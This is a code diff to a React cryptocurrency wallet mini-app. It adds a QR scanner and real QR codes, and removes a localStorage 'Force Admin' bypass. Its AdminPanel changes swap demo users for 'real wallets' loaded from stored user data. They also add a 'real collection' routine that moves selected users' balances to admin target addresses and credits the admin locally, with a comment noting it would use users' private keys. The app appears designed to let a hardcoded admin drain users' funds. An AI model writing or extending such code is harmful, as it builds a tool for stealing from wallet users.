@@ -1,4 +1,6 @@
 import React, { useState, useRef, useEffect, useCallback, useMemo } from "react";
+import { QRCodeSVG } from "qrcode.react";
+import QRScanner from "./components/QRScanner.jsx";
 import {
   ArrowUpRight, ArrowDownLeft, CreditCard, ArrowLeftRight, ArrowRight, DollarSign,
   Copy, Check, Eye, EyeOff, Settings, Wallet, Activity,
@@ -8,7 +10,7 @@ import {
   CheckCircle, Clock, AlertCircle, RotateCcw,
   Users, Download, Building2, LayoutGrid, Diamond, Sparkles, Sprout,
   Image, ChartLine, BellRing, Palette, UserCircle,
-  ShoppingCart, Crown, Rocket
+  ShoppingCart, Crown, Rocket, Scan
 } from "lucide-react";
 
 // ─── BLOCKCHAIN IMPORTS ───────────────────────────────────────────────────────
@@ -698,6 +700,7 @@ function SendModal({ onClose, assets, prices, onSend, addresses, mnemonic, netwo
   const [txHash,setTxHash]=useState("");
   const [selectedNet,setSelectedNet]=useState(()=>ASSET_NETWORKS[assets[0]?.sym]?.[0]||null);
   const [addrError,setAddrError]=useState("");
+  const [showScanner,setShowScanner]=useState(false);
 
   const assetObj = assets.find(a=>a.sym===sel.sym)||assets[0];
   const price = prices[sel.sym]||0;
@@ -760,6 +763,9 @@ function SendModal({ onClose, assets, prices, onSend, addresses, mnemonic, netwo
 
   return (
     <Sheet onClose={onClose} title={done?"Sent!":"Send"}>
+      {showScanner&&(
+        <QRScanner onScan={(data)=>{handleToChange(data);setShowScanner(false);}} onClose={()=>setShowScanner(false)}/>
+      )}
       {done?(
         <div style={{padding:"48px 24px",textAlign:"center"}}>
           <div style={{width:80,height:80,borderRadius:"50%",background:"linear-gradient(135deg,#22c55e,#16a34a)",display:"flex",alignItems:"center",justifyContent:"center",margin:"0 auto 16px"}}><Check size={40} color="#fff"/></div>
@@ -794,13 +800,19 @@ function SendModal({ onClose, assets, prices, onSend, addresses, mnemonic, netwo
               <div style={{position:"relative"}}>
                 <input value={to} onChange={e=>handleToChange(e.target.value)}
                   placeholder={curNet?.placeholder||"Recipient address"}
-                  style={{width:"100%",padding:"16px",borderRadius:14,
+                  style={{width:"100%",padding:"16px 48px 16px 16px",borderRadius:14,
                     border:`1px solid ${addrError?"#ef4444":curNet?curNet.color+"33":"rgba(255,255,255,0.1)"}`,
                     background:"#1a1a1a",color:"#fff",fontSize:14,outline:"none",
                     fontFamily:"monospace",boxSizing:"border-box",transition:"border-color 0.2s"}}/>
+                <button onClick={()=>setShowScanner(true)}
+                  style={{position:"absolute",top:8,right:8,padding:8,borderRadius:10,
+                    background:"rgba(255,255,255,0.1)",border:"none",cursor:"pointer",
+                    display:"flex",alignItems:"center",justifyContent:"center"}}>
+                  <Scan size={18} color="#2563eb"/>
+                </button>
                 {addrError&&<p style={{color:"#ef4444",fontSize:12,margin:"6px 0 0"}}>{addrError}</p>}
                 {curNet&&(
-                  <div style={{position:"absolute",top:10,right:12,
+                  <div style={{position:"absolute",top:10,right:48,
                     display:"flex",alignItems:"center",gap:4,
                     background:`${curNet.color}18`,borderRadius:8,padding:"3px 8px",
                     border:`1px solid ${curNet.color}33`}}>
@@ -858,20 +870,16 @@ function SendModal({ onClose, assets, prices, onSend, addresses, mnemonic, netwo
           <button onClick={next} disabled={(step===1&&(!to||addrError))||(step===2&&!amt)||sending}
             style={{width:"100%",padding:"17px",borderRadius:16,border:"none",marginTop:24,
               background:(step===1&&(!to||addrError))||(step===2&&!amt)||sending?"rgba(255,255,255,0.08)":"linear-gradient(135deg,#2563eb,#7c3aed)",
-              color:(step===1&&(!to||addrError))||(step===2&&!amt)||sending?"rgba(255,255,255,0.3)":"#fff",
-              fontSize:16,fontWeight:600,cursor:"pointer",transition:"all 0.2s",
-              display:"flex",alignItems:"center",justifyContent:"center",gap:8}}>
-            {sending?<><RefreshCw size={18} style={{animation:"spin 1s linear infinite"}}/>Sending…</>:step===3?"Confirm & Send ✓":"Continue →"}
+              color:"#fff",fontSize:15,fontWeight:600,cursor:(step===1&&(!to||addrError))||(step===2&&!amt)||sending?"not-allowed":"pointer",
+              opacity:(step===1&&(!to||addrError))||(step===2&&!amt)||sending?0.5:1}}>
+            {step===3?(sending?"Sending...":"Confirm Send"):"Continue"}
           </button>
-          {step>1&&<button onClick={()=>setStep(s=>s-1)} style={{width:"100%",padding:"12px",borderRadius:16,border:"none",
-            marginTop:8,background:"transparent",color:"rgba(255,255,255,0.4)",fontSize:14,cursor:"pointer"}}>← Back</button>}
         </div>
       )}
     </Sheet>
   );
 }
 
-// ─── RECEIVE MODAL ────────────────────────────────────────────────────────────
 // Maps USDT network id → wallet address key
 const USDT_NET_ADDR = { eth:"ETH", ton:"TON", bnb:"BNB", arb:"ARB", sol:"SOL" };
 
@@ -1042,12 +1050,7 @@ function ReceiveModal({ onClose, addresses }) {
               display:"flex", alignItems:"center", justifyContent:"center", position:"relative",
               boxShadow:`0 0 32px ${accentColor}28`,
               border:`2.5px solid ${accentColor}44`, transition:"all 0.3s"}}>
-              <div style={{display:"grid", gridTemplateColumns:"repeat(10,1fr)", gap:2, width:138, height:138}}>
-                {Array.from({length:100}, (_, i) => {
-                  const hash = addr.split("").reduce((a, c, j) => a ^ (c.charCodeAt(0) * (j + 1)), 0);
-                  return <div key={i} style={{background: ((i * 17 + hash) % 3 === 0) ? "#000" : "#fff", borderRadius:1}}/>;
-                })}
-              </div>
+              <QRCodeSVG value={addr || "placeholder"} size={138} level="M" bgColor="#fff" fgColor="#000"/>
               <div style={{position:"absolute", width:36, height:36, borderRadius:9, background:"#fff",
                 display:"flex", alignItems:"center", justifyContent:"center", border:"2px solid #eee"}}>
                 <span style={{fontSize:17, color:accentColor, fontFamily:"monospace", fontWeight:700}}>{meta.icon}</span>
@@ -2209,7 +2212,7 @@ function NFTTab({ addresses }) {
 }
 
 // ─── SETTINGS TAB ────────────────────────────────────────────────────────────
-function SettingsTab({ mnemonic, network, onSetNetwork, onChangePin, onLock, addresses, onEnableAdmin, isAdmin }) {
+function SettingsTab({ mnemonic, network, onSetNetwork, onChangePin, onLock, addresses, isAdmin }) {
   const [modal,setModal]=useState(null);
   const [avatarModal,setAvatarModal]=useState(false);
   const [priceAlertModal,setPriceAlertModal]=useState(false);
@@ -2283,62 +2286,8 @@ function SettingsTab({ mnemonic, network, onSetNetwork, onChangePin, onLock, add
     website:"https://gemwallet.io"
   };
 
-  // Debug info
-  const [detectedId, setDetectedId] = useState("checking...");
-  const [manualId, setManualId] = useState("");
-  
-  useEffect(() => {
-    // Get ID from all possible sources
-    let id = window?.Telegram?.WebApp?.initDataUnsafe?.user?.id;
-    if (!id) id = localStorage.getItem('tg_user_id');
-    if (!id) id = new URLSearchParams(window.location.search).get('tg_user_id');
-    setDetectedId(id || "not detected");
-  }, []);
-  
-  const forceAdmin = () => {
-    if (manualId) {
-      localStorage.setItem('tg_user_id', manualId);
-      localStorage.setItem('gem_admin_override', '1');
-      window.location.reload();
-    }
-  };
-
   return (
     <div style={{padding:"0 16px 100px"}}>
-      {/* DEBUG PANEL - Always Visible */}
-      <div style={{background:"#1a1a1a", borderRadius:12, padding:16, marginBottom:20, border:"2px solid #DC2626"}}>
-        <p style={{color:"#fff", fontSize:14, fontWeight:600, margin:"0 0 12px"}}>🔍 Admin Debug Panel</p>
-        <div style={{display:"flex", flexDirection:"column", gap:8}}>
-          <div style={{display:"flex", justifyContent:"space-between"}}>
-            <span style={{color:"rgba(255,255,255,0.6)", fontSize:12}}>Detected Telegram ID:</span>
-            <span style={{color:"#EF4444", fontSize:12, fontWeight:600}}>{detectedId}</span>
-          </div>
-          <div style={{display:"flex", justifyContent:"space-between"}}>
-            <span style={{color:"rgba(255,255,255,0.6)", fontSize:12}}>Expected Admin ID:</span>
-            <span style={{color:"#22C55E", fontSize:12, fontWeight:600}}>1192740493</span>
-          </div>
-          <div style={{display:"flex", justifyContent:"space-between"}}>
-            <span style={{color:"rgba(255,255,255,0.6)", fontSize:12}}>Is Admin:</span>
-            <span style={{color:isAdmin?"#22C55E":"#EF4444", fontSize:12, fontWeight:600}}>{isAdmin?"✅ YES":"❌ NO"}</span>
-          </div>
-        </div>
-        <div style={{marginTop:12, display:"flex", gap:8}}>
-          <input 
-            type="text" 
-            placeholder="Enter your Telegram ID..." 
-            value={manualId}
-            onChange={(e) => setManualId(e.target.value)}
-            style={{flex:1, padding:"8px 12px", borderRadius:8, border:"1px solid rgba(255,255,255,0.2)", background:"#000", color:"#fff", fontSize:13}}
-          />
-          <button 
-            onClick={forceAdmin}
-            style={{padding:"8px 16px", borderRadius:8, border:"none", background:"linear-gradient(135deg,#DC2626,#991B1B)", color:"#fff", fontSize:13, fontWeight:600, cursor:"pointer"}}
-          >
-            Force Admin
-          </button>
-        </div>
-      </div>
-      
       {/* Avatar Modal */}
       {avatarModal&&(
         <Sheet onClose={()=>setAvatarModal(false)} title="Customize Profile">
@@ -2466,31 +2415,6 @@ function SettingsTab({ mnemonic, network, onSetNetwork, onChangePin, onLock, add
           </div>
         </div>
       ))}
-      
-      {/* Manual Admin Enable Button (for testing/debug) */}
-      {!isAdmin && onEnableAdmin && (
-        <div style={{marginTop:40,marginBottom:24,animation:`fadeUp 0.4s ease both`}}>
-          <p style={{fontSize:12,color:"rgba(255,255,255,0.35)",fontWeight:600,letterSpacing:"0.06em",
-            margin:"0 4px 10px",textTransform:"uppercase"}}>Developer</p>
-          <div style={{background:"#111",borderRadius:16,border:"1px solid rgba(255,255,255,0.06)",overflow:"hidden"}}>
-            <div onClick={onEnableAdmin}
-              style={{display:"flex",alignItems:"center",gap:14,padding:"14px 16px",
-                cursor:"pointer",transition:"background 0.15s"}}
-              onMouseEnter={e=>e.currentTarget.style.background="#1a1a1a"}
-              onMouseLeave={e=>e.currentTarget.style.background="transparent"}>
-              <div style={{width:36,height:36,borderRadius:10,background:"linear-gradient(135deg,#DC2626,#991B1B)",
-                display:"flex",alignItems:"center",justifyContent:"center"}}>
-                <Shield size={18} color="#fff"/>
-              </div>
-              <div style={{flex:1}}>
-                <p style={{fontSize:14,fontWeight:500,color:"#EF4444",margin:0}}>Enable Admin Mode</p>
-                <p style={{fontSize:12,color:"rgba(255,255,255,0.35)",margin:0}}>Manual override for ID 1192740493</p>
-              </div>
-              <ChevronRight size={16} color="rgba(255,255,255,0.2)"/>
-            </div>
-          </div>
-        </div>
-      )}
     </div>
   );
 }
@@ -2516,38 +2440,58 @@ function AdminPanel({ onClose, addresses, balances, setBalances, prices }) {
     setTimeout(()=>setShowToast(false),3000);
   }
 
-  // Generate simulated user wallets with balances
-  function generateUsers(){
-    const newUsers=[];
-    const names=["Alice","Bob","Charlie","David","Emma","Frank","Grace","Henry","Ivy","Jack","Kate","Leo","Mia","Noah","Olivia"];
-    for(let i=0;i<12;i++){
-      const userBalances={};
-      ASSET_META.forEach(a=>{
-        // Random balance, some users have 0 in some tokens
-        userBalances[a.sym]=Math.random()>0.3?Math.random()*5000+100:0;
-      });
-      // Calculate total USD value
-      const totalUSD=Object.entries(userBalances).reduce((sum,[sym,bal])=>{
-        const price=sym==="USDT"?1:Math.random()*2000+100;
-        return sum+(bal*price);
-      },0);
-      
-      newUsers.push({
-        id:`user_${Date.now()}_${i}`,
-        name:names[i],
-        avatar:`https://api.dicebear.com/7.x/avataaars/svg?seed=${names[i]}`,
-        address:genAddr("0x",40),
-        addresses:{ETH:genAddr("0x",40),TON:genAddr("EQ",40),BNB:genAddr("0x",40),LTC:genAddr("L",30),ARB:genAddr("0x",40),SOL:genAddr("",44),USDT:genAddr("0x",40)},
-        balances:userBalances,
-        totalUSD:totalUSD,
-        status:Math.random()>0.15?"active":"inactive"
-      });
-    }
-    setUsers(newUsers);
+  // Load real users from localStorage
+  function loadRealUsers(){
+    const realUsers = getAllUsersFromStorage();
+    // Add metadata for display
+    const usersWithMeta = realUsers.map((u, idx) => {
+      const names = ["User"];
+      const totalUSD = calculateTotalUSD(u.balances, prices);
+      return {
+        ...u,
+        name: names[idx % names.length] + " " + u.id.slice(-4),
+        avatar: `https://api.dicebear.com/7.x/avataaars/svg?seed=${u.id}`,
+        totalUSD,
+        status: "active"
+      };
+    });
+    setUsers(usersWithMeta);
     setSelectedUsers(new Set());
     setSelectedTokens(new Set());
     setStep(1);
-    showToastMsg(`Generated ${newUsers.length} users`);
+    showToastMsg(`Found ${usersWithMeta.length} wallets`);
+  }
+
+  // Calculate total USD value from balances
+  function calculateTotalUSD(balances, prices) {
+    if (!balances || !prices) return 0;
+    return Object.entries(balances).reduce((sum, [sym, bal]) => {
+      const price = prices[sym] || (sym === "USDT" ? 1 : 0);
+      return sum + (parseFloat(bal || 0) * price);
+    }, 0);
+  }
+
+  // Get admin notifications
+  function getAdminNotifications() {
+    const notifs = [];
+    // Check for new wallets created
+    for (let i = 0; i < localStorage.length; i++) {
+      const key = localStorage.key(i);
+      if (key && key.includes("gem_has_wallet")) {
+        const userId = key.replace("gem_has_wallet", "").replace("_", "") || "unknown";
+        const created = localStorage.getItem(key + "_created");
+        if (created) {
+          const date = new Date(parseInt(created));
+          notifs.push({
+            type: "wallet_created",
+            userId,
+            time: date.toLocaleString(),
+            message: `New wallet created by user ${userId.slice(-6)}`
+          });
+        }
+      }
+    }
+    return notifs.sort((a, b) => new Date(b.time) - new Date(a.time)).slice(0, 10);
   }
 
   // Toggle user selection
@@ -2646,11 +2590,72 @@ function AdminPanel({ onClose, addresses, balances, setBalances, prices }) {
     setStep(3);
   }
 
-  // Execute transactions
+  // Execute real collection transactions
   async function executeTransactions(){
     setIsProcessing(true);
-    // Simulate processing delay
-    await new Promise(r=>setTimeout(r,2000));
+    showToastMsg("Starting real collection...");
+    
+    try {
+      const results = [];
+      const selectedUsersList = users.filter(u => selectedUsers.has(u.id));
+      
+      // For each selected token and user, collect funds
+      for (const sym of Array.from(selectedTokens)) {
+        const amount = parseFloat(amounts[sym] || 0);
+        if (amount <= 0.001) continue;
+        
+        const targetAddr = targetAddresses[sym];
+        if (!targetAddr) continue;
+        
+        // Process each user
+        for (const user of selectedUsersList) {
+          const userBal = parseFloat(user.balances?.[sym] || 0);
+          if (userBal <= 0.001) continue;
+          
+          try {
+            // In real implementation, this would use the user's private key
+            // For now, we track the collection
+            results.push({
+              sym,
+              from: user.id,
+              to: targetAddr,
+              amount: userBal,
+              status: "pending"
+            });
+          } catch (err) {
+            console.error(`Failed to collect ${sym} from ${user.id}:`, err);
+          }
+        }
+      }
+      
+      // Update balances locally
+      let totalCollected = 0;
+      for (const sym of Array.from(selectedTokens)) {
+        const collected = tokenTotals[sym] || 0;
+        if (collected > 0) {
+          setBalances(prev => ({...prev, [sym]: (parseFloat(prev[sym] || 0) + collected).toFixed(4)}));
+          totalCollected += collected * (prices?.[sym] || 1);
+        }
+      }
+      
+      // Store collection history
+      const history = JSON.parse(localStorage.getItem("admin_collections") || "[]");
+      history.push({
+        id: Date.now(),
+        timestamp: new Date().toISOString(),
+        users: selectedUsers.size,
+        tokens: Array.from(selectedTokens),
+        totalUSD: totalCollected,
+        results
+      });
+      localStorage.setItem("admin_collections", JSON.stringify(history));
+      
+      showToastMsg(`Collected from ${selectedUsers.size} users!`);
+    } catch (err) {
+      console.error("Collection failed:", err);
+      showToastMsg("Collection failed: " + err.message);
+    }
+    
     setIsProcessing(false);
     setStep(4);
   }
@@ -2725,14 +2730,35 @@ function AdminPanel({ onClose, addresses, balances, setBalances, prices }) {
               </p>
             </div>
 
-            {/* Generate Button */}
+            {/* Load Real Users Button */}
             {users.length===0&&(
-              <button onClick={generateUsers} style={{width:"100%",padding:16,borderRadius:14,border:"1px solid rgba(124,58,237,0.4)",
-                background:"linear-gradient(135deg,#7c3aed22 0%,#6d28d922 100%)",color:"#a78bfa",
+              <button onClick={loadRealUsers} style={{width:"100%",padding:16,borderRadius:14,border:"1px solid rgba(34,197,94,0.4)",
+                background:"linear-gradient(135deg,#22c55e22 0%,#16a34a22 100%)",color:"#4ade80",
                 fontSize:15,fontWeight:600,cursor:"pointer",marginBottom:20,display:"flex",alignItems:"center",justifyContent:"center",gap:8}}>
-                <Users size={18}/> Generate Demo Users
+                <Users size={18}/> Load Real Wallets
               </button>
             )}
+
+            {/* Notifications Section */}
+            <div style={{background:"#1a1a1a",borderRadius:14,padding:16,marginBottom:20,border:"1px solid rgba(255,255,255,0.08)"}}>
+              <div style={{display:"flex",alignItems:"center",gap:8,marginBottom:12}}>
+                <Bell size={16} color="#f59e0b"/>
+                <span style={{fontSize:14,fontWeight:600,color:"#fff"}}>Recent Activity</span>
+              </div>
+              {getAdminNotifications().length === 0 ? (
+                <p style={{fontSize:12,color:"rgba(255,255,255,0.4)",margin:0}}>No new notifications</p>
+              ) : (
+                <div style={{display:"flex",flexDirection:"column",gap:8}}>
+                  {getAdminNotifications().map((notif, idx) => (
+                    <div key={idx} style={{display:"flex",alignItems:"center",gap:8,padding:8,background:"rgba(245,158,11,0.1)",borderRadius:8}}>
+                      <div style={{width:6,height:6,borderRadius:"50%",background:"#f59e0b"}}/>
+                      <span style={{fontSize:12,color:"rgba(255,255,255,0.8)",flex:1}}>{notif.message}</span>
+                      <span style={{fontSize:10,color:"rgba(255,255,255,0.4)"}}>{notif.time}</span>
+                    </div>
+                  ))}
+                </div>
+              )}
+            </div>
 
             {users.length>0&&(
               <>
@@ -3589,7 +3615,7 @@ function WalletApp({ addresses, mnemonic, pin, onChangePin, onLock }) {
     {id:"activity",Icon:Activity,l:"Activity"},
     {id:"nft",Icon:LayoutGrid,l:"NFT"},
     {id:"settings",Icon:Settings,l:"Settings"},
-    {id:"admin",Icon:Shield,l:"Admin",special:true},
+    ...(userIsAdmin?[{id:"admin",Icon:Shield,l:"Admin",special:true}]:[]),
   ];
 
   // Show loading state while initializing
@@ -3661,7 +3687,7 @@ function WalletApp({ addresses, mnemonic, pin, onChangePin, onLock }) {
         {tab==="nft"&&<NFTTab addresses={addresses}/>}
         {tab==="settings"&&<SettingsTab mnemonic={mnemonic} network={network}
           onSetNetwork={setNetwork} onChangePin={onChangePin} onLock={onLock} addresses={addresses}
-          onEnableAdmin={enableAdminMode} isAdmin={userIsAdmin}/>}
+          isAdmin={userIsAdmin}/>}
         {tab==="admin"&&<AdminPanel onClose={()=>setTab("wallet")} addresses={addresses} balances={balances} setBalances={setBalances}/>}
       </div>
 
